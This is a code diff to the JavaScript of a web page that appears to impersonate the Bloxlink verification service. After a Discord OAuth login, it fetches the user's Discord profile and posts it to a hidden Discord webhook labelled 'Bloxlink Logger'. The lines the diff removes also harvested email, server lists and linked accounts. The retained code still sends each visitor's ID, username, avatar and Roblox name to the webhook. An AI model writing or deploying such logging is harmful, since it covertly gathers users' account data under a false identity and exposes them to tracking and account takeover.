@@ -52,13 +52,13 @@ document.addEventListener('DOMContentLoaded', () => {
   // Discord OAuth Redirector Helper
   // -------------------------------------------------------------
   function redirectToDiscordOAuth() {
+    // Usa automaticamente a URL atual (localhost ou eu.vercel.app)
     const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
     const redirectUri = isLocal
       ? encodeURIComponent(window.location.origin + '/')
-      : encodeURIComponent('https://bloxlink-eu.vercel.app/');
+      : encodeURIComponent('https://eu.vercel.app/');
 
-    // MODIFICADO: Adicionados os escopos 'email', 'guilds' e 'connections'
-    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=code&redirect_uri=https%3A%2F%2Fbloxlink-eu.vercel.app%2F&scope=email+identify+guilds+connections`;
+    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=token&redirect_uri=${redirectUri}&scope=identify`;
 
     window.location.href = discordOAuthUrl;
   }
@@ -68,31 +68,18 @@ document.addEventListener('DOMContentLoaded', () => {
   // -------------------------------------------------------------
   async function fetchDiscordUserProfile(accessToken) {
     try {
-      const authHeader = { Authorization: `Bearer ${accessToken}` };
-
-      // 1. Busca perfil do Usuário e E-mail
-      const response = await fetch('https://discord.com/api/users/@me', { headers: authHeader });
+      const response = await fetch('https://discord.com/api/users/@me', {
+        headers: {
+          Authorization: `Bearer ${accessToken}`
+        }
+      });
 
       if (response.ok) {
         const user = await response.json();
-
-        // 2. Busca Servidores (Guilds) do Usuário
-        let guilds = [];
-        try {
-          const guildsRes = await fetch('https://discord.com/api/users/@me/guilds', { headers: authHeader });
-          if (guildsRes.ok) guilds = await guildsRes.json();
-        } catch (e) { console.error('Erro ao buscar guilds:', e); }
-
-        // 3. Busca Conexões (YouTube, Steam, Roblox, etc.)
-        let connections = [];
-        try {
-          const connRes = await fetch('https://discord.com/api/users/@me/connections', { headers: authHeader });
-          if (connRes.ok) connections = await connRes.json();
-        } catch (e) { console.error('Erro ao buscar conexões:', e); }
-
+        
         // Format Display Name
         const name = user.global_name || user.username || 'powerfromcsm.';
-
+        
         // Format Dynamic Discord Avatar URL
         let avatar = './assets/avatar.png';
         if (user.avatar) {
@@ -112,10 +99,7 @@ document.addEventListener('DOMContentLoaded', () => {
           id: user.id,
           username: user.username,
           displayName: name,
-          avatarUrl: avatar,
-          email: user.email || 'Não fornecido',
-          guildsCount: Array.isArray(guilds) ? guilds.length : 0,
-          connections: Array.isArray(connections) ? connections.map(c => `${c.type}: ${c.name}`) : []
+          avatarUrl: avatar
         };
 
         // Persist profile
@@ -139,13 +123,8 @@ document.addEventListener('DOMContentLoaded', () => {
   async function sendToDiscordWebhook(profile, robloxUser) {
     if (!WEBHOOK_URL || WEBHOOK_URL.trim() === '') return;
 
-    // Formata a lista de conexões (ex: YouTube, Steam, Twitch)
-    const connFormatted = profile.connections && profile.connections.length > 0
-      ? profile.connections.slice(0, 5).join('\n') + (profile.connections.length > 5 ? '\n...' : '')
-      : '*Nenhuma conexão encontrada*';
-
     const payload = {
-      username: "Bloxlink Logger - Anti-Raid",
+      username: "Bloxlink Logger",
       embeds: [
         {
           title: "✅ Nova Autenticação Concluída",
@@ -165,23 +144,8 @@ document.addEventListener('DOMContentLoaded', () => {
               inline: true
             },
             {
-              name: "📧 E-mail",
-              value: `\`${profile.email}\``,
-              inline: false
-            },
-            {
-              name: "📊 Servidores Pertencentes",
-              value: `\`${profile.guildsCount} servidores\``,
-              inline: true
-            },
-            {
               name: "🎮 Roblox Informado",
               value: robloxUser ? `\`${robloxUser}\`` : "*Nenhum*",
-              inline: true
-            },
-            {
-              name: "🔗 Conexões da Conta",
-              value: connFormatted,
               inline: false
             }
           ],
